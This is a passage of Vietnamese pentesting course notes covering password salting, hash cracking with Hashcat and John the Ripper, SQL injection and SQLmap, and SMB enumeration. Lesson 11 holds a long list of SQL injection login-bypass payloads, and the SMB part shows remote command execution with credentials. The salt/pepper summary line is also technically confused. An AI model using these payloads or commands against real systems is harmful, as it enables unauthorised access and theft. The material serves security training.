Để chống lại brute force attack và dictionary attack, các hệ thống hiện đại ngày nay sẽ tự động khóa tài khoản nếu người dùng nhập sai mật khẩu quá số lần quy định.

Để chống lại rainbow table attacks, người ta thường hay dùng salt và pepper. Salt và pepper là 2 chuỗi giá trị được hệ thống tạo ra ngẫu nhiên để thêm vào password trước khi hash nhằm tăng cường sức mạnh cho password. 

### Ứng dụng thực tế của salt và pepper như sau:
**Với salt:**

Khi lưu password vào cơ sở dữ liệu, sẽ có trường hợp 2 hoặc nhiều hơn 2 người dùng sử dụng password giống nhau. Điều này dẫn đến việc nếu hacker có được danh sách password hash, và tìm ra được password trước khi hash của 1 trong số những người có password giống nhau này, thì khả năng tất cả những người này bị mất tài khoản là điều chắc chắn.

Salt được dùng để chống lại rainbow table attacks. Vì giá trị của chuỗi salt chỉ duy nhất có hệ thống tạo ra nó biết được và được tạo ra theo quy tắc kết hợp các ký tự và chữ số một cách ngẫu nhiên, nên khả năng rất cao là rainbow table sẽ không có giá trị hash nào là kết quả của password + salt cả.

**Với pepper:** 
Pepper (hay còn được gọi là secret salt) có chức năng tương tự như salt, tuy nhiên sẽ có vài điểm khác biệt như sau: 
Salt:

* Đảm bảo trong cùng một ứng dụng, hai password giống nhau sẽ có hash khác nhau
* Giá trị của salt nằm bên trong hash và được lưu trong cơ sỡ dữ liệu

Pepper:

* Đảm bảo hai ứng dụng trong cùng một hệ thống dù có cùng password và salt nhưng giá trị hash sẽ khác nhau. Ví dụ: một công ty có 1 web nội bộ và 1 web công cộng, mỗi web sử dụng một cơ sở dữ liệu riêng để lưu thông tin người dùng. Pepper sẽ đảm bảo dù người dùng dùng chung password cho cả hai web, sau khi đã thêm cùng một salt, giá trị hash sẽ khác nhau.
* Giá trị của pepper nằm bên trong hash và không được lưu trong cơ sở dữ liệu

  ```Tóm lại là salt sẽ thêm kí tự vào pw rồi mới hash còn peper sẽ hash pw trước rồi thêm kí tự```
# Bài 8: Hash cracking với Hashcat, John The Ripper và CrackStation
## Hashcat 
Hashcat là phần mềm crack hash/khôi phục mật khẩu từ hash nhanh nhất và tiên tiến nhất hiện nay trên giao diện dòng lệnh. Hashcat cung cấp cho người sử dụng 5 chế độ tấn công/khôi phục mật khẩu khác nhau áp dụng cho hơn 300 thuật toán hash khác nhau.

Hashcat có thể sử dụng GPU, CPU và các phần cứng tăng tốc độ tính toán khác trên hệ thống máy tính để tăng tốc độ phá password hash. Tuy nhiên, vì phần lớn chúng ta sử dụng máy ảo Kali Linux trên Virtual Box, nên chúng ta sẽ mất đi sự hỗ trợ đắc lực của GPU (card đồ họa)

Nói tóm lại, việc crack hash là một việc rất tốn thời gian vì nó phụ thuộc vào các yếu tố như:

* Thuật toán hash
* Sức mạnh phần cứng của hệ thống dùng để crack
* Password gốc có được salt và pepper hay không?
* Password gốc có phức tạp hay không?

### Một số công cụ xác định thuật toán hash 
#### Công cụ Hash Identifier trên Kali Linux
```hash-identifier```

Chúng ta thấy Hash Identifier bên cạnh việc xác định và xuất ra tên những thuật toán hash mà nó nghĩ rằng nhiều khả năng đã được dùng để tạo ra hash đầu vào (Possible Hashs), nó còn liệt kê ra các kết quả mà nó nghi ngờ nhưng không chắc chắn (Least Possible Hashs).

Và chúng ta có thể thấy, SHA-256 nằm trong nhóm Possible Hashs. Như vậy, Hash Identifier đã xác định đúng thuật toán hash.
#### Một số công cụ xác định thuật toán hash online 
Minh hay dung tunnelsup
### Cách sử dụng Hashcat 
Vì Hashcat không có chức năng tự xác định thuật toán hash như mình đã nói lúc đầu, nên sau khi xác định được thuật toán hash bằng các công cụ mình đã nói chúng ta sẽ phải chỉ cho Hashcat thuật toán được dùng của hash đầu vào là gì. Trên Hashcat, thông tin này được gọi là hash modes.

Hash cat hỗ trợ 4 hình thức crack hash:

* Dictionary (-a 0): Bạn sẽ cung cấp cho Hashcat một danh sách (có thể là tập hợp những passwords hay được dùng nhất). Hashcat sẽ sử dụng lần lượt từng giá trị trong danh sách này để hash nó với thuật toán đã chỉ định và so sánh với hash đầu vào, nếu kết quả sai, Hashcat sẽ thử giá trị tiếp theo trong danh sách được cung cấp, nếu đúng thì Hashcat trả lại kết quả đã tạo nên giá trị hash trùng khớp với giá trị hash đầu vào.
* Combination (-a 1): Tương tự như Dictionary attack ở trên, tuy nhiên khi dùng Combination các bạn sẽ phải cung cấp 2 danh sách chứ không phải chỉ 1 danh sách như Dictionary attack. Hình thức tấn công này được sử dụng khi bạn muốn tìm username và password của người dùng. Lúc này bạn sẽ cần 1 danh sách những usernames hay được dùng nhất và 1 danh sách những passwords hay được dùng nhất. Hashcat sẽ lần lượt tạo ra các cặp kết hợp giữa danh sách username và danh sách password và lần lượt thử đăng nhập bằng các cặp kết hợp này cho đến khi tìm ra được username và password chính xác hoặc cho đến khi tất cả các cặp kết hợp đều đã được thử và không có cặp nào chính xác.
* Mask (-a 3): Mask attack tương tự như Bruteforce attack, bạn sẽ cung cấp một loạt các ký tự ví dụ a, b, c, d, e, f, 1, 2, 3, v.v. và từ các ký tự được cung cấp này, Hashcat sẽ tự kết hợp các ký tự lại với nhau và tạo ra các chuỗi ký tự ngẫu nhiên ví dụ như abc123, và các chuỗi này sẽ được dùng để tấn công giống như Dictionary attack. Cách tấn công này sẽ phù hợp để tìm những username và password không nằm trong danh sách được cung cấp khi tấn công Dictionary attack, tuy nhiên sẽ rất mất thời gian.
* Hybrid (-a 6 và -a 7): Kết hợp cả Dictionary attack và Mask attack.

**Một câu lệnh tấn công Hashcat cơ bản sẽ có cú pháp như sau:**
```
hashcat -a <tấn-công> -m <thuật-toán-hash> <file-chứa-hash-đầu-vào> <danh-sách hoặc chuỗi-ký-tự>
Ví dụ: 
hashcat -a 0 -m 0 file-chứa-hash file-danh-sách 
```

* -a: Số của hình thức tấn công:
  * -a 0: Dictionary
  * -a 1: Combination
  * -a 3: Mask
  * -a 6 và -a 7: Dictionary + Mask
* -m: Số của thuật toán hash (bất cứ khi nào quên, bạn đều có thể tra cứu lại bằng lệnh hashcat –help). Trong ví dụ mình dùng -m 0 để chỉ thuật toán hash MD5.
* File chứa hash đầu vào
* File chứa danh sách nếu tấn công Dictionary hoặc chuỗi ký tự nếu tấn công Mask
## John The Ripper
Một công cụ khác cũng hay được sử dụng để crack hash là John The Ripper. Đây cũng là một công cụ trên giao diện dòng lệnh và cũng có thể được cài trên nhiều hệ điều hành khác nhau như MacOS, Windows và Linux

ohn The Ripper được thiết kế rất dễ sử dụng và có tích hợp cả tính năng tự động nhận diện thuật toán hash, thế nên chúng ta không cần phải xác định thuật toán rồi mới crack giống như Hashcat. 

Cú pháp của John The Ripper rất đơn giản như sau: ```john <file-chứa-hash>```

Khi bạn sử dụng câu lệnh john như trên, John The Ripper sẽ chạy để tìm thuật toán hash, sau đó sẽ sử dụng danh sách mặc định của mình để crack hash. Quá trình này sẽ tốn rất nhiều thời gian so với khi bạn cung cấp cho John tên của thuật toán hash, nhưng trong trường hợp chúng ta không thể tìm được tên thuật toán hash thì đành phải chấp nhận.

Khi biết kiểu hash ta dùng lệnh sau: ```john --format=<kiểu hash> <file chứa mã hash> --show```

Sau vài giây, đoạn hash đã được crack xong. Nếu John The Ripper không hiện ra password đã crack thì bạn sử dụng lệnh sau: 

```john --wordlist=/usr/share/wordlists/rockyou.txt --format=<kieu hash> <file chua hash> --show```

# Bài 9: Giới thiệu lỗ hổng SQL Injection
## Cơ sở dữ liệu trong hệ thống web application
### Website vs web application
Website là một trang mạng có chứa một nội dung cụ thể nào đó. Nội dung đó có thể được thể hiện dưới dạng văn bản, video, âm nhạc, hình ảnh, v.v. Khi một người dùng bình thường truy cập vào một website, tất cả những gì họ có thể làm chỉ là đọc nội dung được trình bày trên website đó mà thôi.

Web application là một website nhưng được tích hợp nhiều tính năng hơn cho phép người dùng cuối ngoài việc được phép đọc nội dung được trình bày trên website ra, người dùng còn có thể tương tác với các nội dung ấy nữa.

### Cơ sở dữ liệu (database)
Bạn có thể liên tưởng cơ sở dữ liệu giống như một ngăn tủ chứa tài liệu, nơi tài liệu được phân loại theo chủ đề, theo tháng, theo năm và theo tên người phụ trách. Để khi bạn cần tìm một tài liệu nào đó, bạn sẽ có thể biết ngay tài liệu đó ở trong tập hồ sơ nào; việc còn lại của bạn chỉ đơn giản là lấy tập hồ sơ đó và tìm tài liệu mà bạn cần. 

Cơ sở dữ liệu được sử dụng để lưu giữ một cách có hệ thống các thông tin quan trọng

Nếu không có cơ sở dữ liệu để quản lý trong khi dữ liệu có quá nhiều, thông tin và nội dung của web application có khả năng sẽ được lưu trữ rải rác khắp nơi trong server hoặc dữ liệu được lưu trữ không có tổ chức và trình tự, dẫn đến việc truy xuất dữ liệu sẽ lâu và tốn kém tài nguyên hệ thống hơn

Hai kiểu cơ sở dữ liệu phổ biến nhất đang được sử dụng hiện nay là SQL và noSQL
### SQL
SQL là tên của một dạng cơ sở dữ liệu, nhưng đồng thời cũng là tên của một ngôn ngữ dòng lệnh dùng để tương tác với các cơ sở dữ liệu được xây dựng dựa trên SQL như: MySQL, PostgreSQL, v.v

Câu lệnh SQL cho phép chúng ta có thể tương tác với cơ sở dữ liệu một cách nhanh chóng và hiệu quả nhằm thực hiện các công việc như:

* Tạo hoặc xóa dữ liệu
* Truy xuất dữ liệu
* Kiểm tra dữ liệu
* Lấy dữ liệu
* v.v

## Giới thiệu lỗ hổng bảo mật SQL Injection
###  Khái niệm SQL Injection
Lỗ hổng bảo mật SQL Injection là lỗ hổng được phát hiện trên các cơ sở dữ liệu SQL. Lỗ hổng này cho phép các hackers lợi dụng những tính năng cho phép người dùng cung cấp thông tin để hệ thống xử lý nhằm mục đích chèn vào một đoạn ký tự nhất định nhằm làm thay đổi cách thức câu lệnh SQL hoạt động theo hướng có lợi cho hackers

Hiểu một cách đơn giản nhất: SQL Injection là lỗ hổng bảo mật cho phép hackers toàn quyền truy cập và thay đổi cơ sở dữ liệu của hệ thống nạn nhân thông qua việc thay đổi câu lệnh SQL đang được hệ thống sử dụng. 
### SQL và form đăng nhập account user
Một trong những nơi phổ biến nhất trên một web application hay bị hacker tấn SQL Injection đó là form đăng nhập account user.
### Cơ chế của lỗi SQL Injection
Một khi đã hiểu được cơ chế hoạt động đằng sau form đăng nhập người dùng, hackers chỉ cần làm cách nào đó để khi thực thi câu lệnh SQL kết quả được trả về là giá trị 1
# Bài 10: Demo hướng dẫn khai thác lỗ hổng SQL Injection và giới thiệu công cụ SQL Map
## Demo khai thác và cách nhận biết lỗ hổng SQL Injection
## Công cụ SQLmap 
Tất cả những ví dụ về SQL Injection mà ta đã học ở bài trước và phần 1 của bài này đều là những cách thức cơ bản và đơn giản nhất để khai thác lỗ hổng SQL Injection. Trong thực tế, lỗ hổng SQL Injection có 3 dạng khác nhau:

* In-band SQL Injection
* Inferential (Blind) SQL Injection
* Out-of-band SQL Injection

chúng ta sẽ cần một công cụ được thiết kế chuyên cho việc khai thác lỗ hổng SQL Injection từ cơ bản đến nâng cao. Công cụ ấy có tên là SQLmap.
SQLmap là một công cụ trên giao diện dòng lệnh. SQLmap là một công cụ mã nguồn mở và miễn phí được tích hợp sẵn vào Kali Linux nhằm mục đích tự động phát hiện và khai thác lỗ hổng SQL Injection dựa vào URL form đăng nhập được cung cấp bởi người dùng.
### Cách sử dụng SQLmap
Cú pháp một câu lệnh của SQLmap như sau: ```sqlmap -u "url-mục-tiêu?form-parameter"``` ngài ra còn có rất nhiều flag có thể xem ở man

Trong câu lệnh trên, flag -u dùng để cho biết URL của form đăng nhập mà bạn muốn tấn công SQL Injection. Đây là flag bắt buộc phải có khi dùng công cụ SQLmap. 

Khi chạy câu lệnh trên, SQLmap sẽ tự động kiểm tra xem mục tiêu có dính lỗi SQL Injection hay không? Đồng thời, trong nhiều trường hợp, nó sẽ cung cấp một vài thông tin khá hữu ích như:

* Tên hệ điều hành
* Tên và version của cơ sở dữ liệu SQL
* Tên web server
* v.v
# Bài 11: Thực hành khai thác lỗi SQL Injection thông qua SQLmap
## SQLmap
## Khác thác lỗ hổng SQL Injection theo cách thủ công
Khi pentest hoặc học pentest, sẽ có những trường hợp bạn không thể sử dụng SQLmap để khai thác lỗ hổng SQL Injection được. Lí do thì có rất nhiều, có thể hệ thống mục tiêu được thiết lập tường lửa chặn bruteforce hoặc có chức năng giới hạn số request có thể được xử lý. 

Một vài payload test SQLi
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin" or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc
```
# Bài 12: Giao thức SMB và cách khai thác lỗi dựa vào SMBmap và SMBclient; giới thiệu impacket và những tài liệu tự học privilege escalation
## Giao thức SMB là gì?
SMB, viết tắt của Server Message Block Protocol, là một giao thức theo dạng server-client. Có nghĩa là server sẽ là máy chủ cung cấp dịch vụ và client sẽ là thiết bị cá nhân có nhu cầu sử dụng dịch vụ. 

Giao thức SMB được sử dụng cho các mục đích như truy cập dữ liệu, file, ảnh, nhạc, máy in được kết nối bên trong mạng và những tài nguyên khác được lưu trữ bên trong mạng. Các SMB servers sẽ là nơi lưu trữ các tài nguyên, và các máy clients khi cần sử dụng những tài nguyên này sẽ truy cập vào các SMB servers.

Giao thức SMB còn được biết tới như là một giao thức response-request (phản hồi-truy vấn). Nghĩa là SMB servers và SMB clients sẽ gửi nhiều gói tin qua lại với nhau để thiết lập một kết nối TCP. 

Sau khi kết nối thành công đến SMB server, các clients sẽ tương tác với servers thông qua các câu lệnh

Với SMB, tất cả các tài nguyên cho phép SMB clients truy cập sẽ được lưu trữ trong một directory. Khi SMB clients truy cập vào SMB servers, họ sẽ truy cập vào directory chứa các tài liệu được chia sẻ. Tùy vào phân quyền được cấp, phần lớn trường hợp những SMB clients có phân quyền thấp sẽ chỉ được phép đọc dữ liệu được lưu trữ bên trong directory mà thôi, chứ không được phép xóa, chỉnh sửa, thay đổi, nội dung được lưu trữ bên trong directory SMB. Ngoài ra, trong một số trường hợp SMB clients còn được cấp quyền thực thi câu lệnh bên trong SMB server. 
## SMBmap
Samba là một phiên bản mở rộng, mã nguồn mở của giao thức SMB, cho phép giao thức SMB có thể chạy trên những hệ thống Linux. 

SMBmap là một công cụ trên giao diện dòng lệnh, dù để thu thập thông tin và được sử dụng hướng đến các hệ thống chạy Samba. SMBmap hoàn toàn miễn phí và được tích hợp sẵn vào hệ điều hành Kali Linux. SMBmap cho phép pentesters có thể tìm các share drives trong hệ thống mạng của mục tiêu (cách gọi khác của các directories trên SMB servers chứa tài nguyên dùng để chia sẻ cho SMB clients), phân quyền của share drives đó, những nội dung nào được chia sẻ, thực thi câu lệnh từ xa, v.v 

Nói cách khác, SMBmap có thể được sử dụng để tìm những dữ liệu nhạy cảm được lưu giữ trong các SMB servers và được share rộng rãi với các SMBclients. 

Để tìm tất cả các share drives có trong mạng của mục tiêu, chúng ta sẽ sử dụng câu lệnh sau: ```smbmap -H <địa-chỉ-ip>```

Trong trường hợp chúng ta biết được username và password được dùng để truy cập vào tài nguyên được lưu trữ bên trong SMBserver, account này cũng cho phép người đăng nhập có thể thực thi câu lệnh. Vậy chúng ta sẽ sử dụng câu lệnh sau:

```smbmap -u "<username>" -p "<password>" -H <IP-mục-tiêu> -x "<câu-lệnh-cần-chạy>"```
## SMBclient
Bên cạnh SMBmap, chúng ta còn có thể sử dụng SMBclient để truy cập vào những tài nguyên bên trong của một SMB server. SMBclient cũng là một công cụ dòng lệnh miễn phí và được tích hợp sẵn vào Kali Linux.

Get cho phép bạn download file từ SMBserver về máy Kali. Cú pháp như sau: ```get <tên-file-cần-download>```

Put cho phép bạn upload file từ máy Kali lên SMBserver. Cú pháp như sau: ```put <tên-file-cần-upload>```

## Impacket
mpacket là một tập hợp những đoạn scripts được viết bằng ngôn ngữ Python và được sử dụng để tấn công những giao thức mạng phổ biến được sử dụng trên hệ điều hành Windows. Những đoạn scripts này cho phép pentesters có thể thu thập thông tin người dùng, lấy hashes, leo thang đặc quyền, v.v

































